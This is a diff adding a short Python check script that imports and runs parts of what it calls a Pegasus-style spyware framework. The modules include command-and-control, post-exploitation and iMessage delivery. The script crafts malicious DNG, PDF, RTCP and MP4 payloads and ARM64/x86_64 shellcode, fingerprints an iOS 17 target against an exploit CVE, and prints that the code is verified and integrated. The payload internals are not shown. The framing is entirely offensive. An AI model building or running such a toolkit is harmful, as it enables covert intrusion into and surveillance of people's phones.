@@ -1,0 +1,13 @@
+import sys, os
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+import graphite, operational_framework, poc_device_fingerprinting, poc_live_fetch, poc_payloads, dng_payload, voip_handler, c2_module, c2_server, post_exploit, imessage_delivery, pdf_payload, native_wrapper
+print('ALL 12 PYTHON MODULES: IMPORT OK')
+from native_wrapper import fingerprint, craft_rtcp, craft_dng, craft_pdf, craft_mp4, shellcode_arm64, shellcode_x86_64
+r = fingerprint(8437760, [8455555], platform_hint=2, ios_version=17)
+print('Native fingerprint:', r['platform_name'], r['confidence'], r['exploit_cve'])
+rtcp = craft_rtcp(); dng = craft_dng(); pdf = craft_pdf(); mp4 = craft_mp4()
+sc_arm = shellcode_arm64(); sc_x86 = shellcode_x86_64()
+print('RTCP:', len(rtcp), 'DNG:', len(dng), 'PDF:', len(pdf), 'MP4:', len(mp4))
+print('Shellcode ARM64:', len(sc_arm), 'x86_64:', len(sc_x86))
+print('NATIVE CORE: VERIFIED')
+print('ALL PEGASUS CODE EXTRACTED AND INTEGRATED')
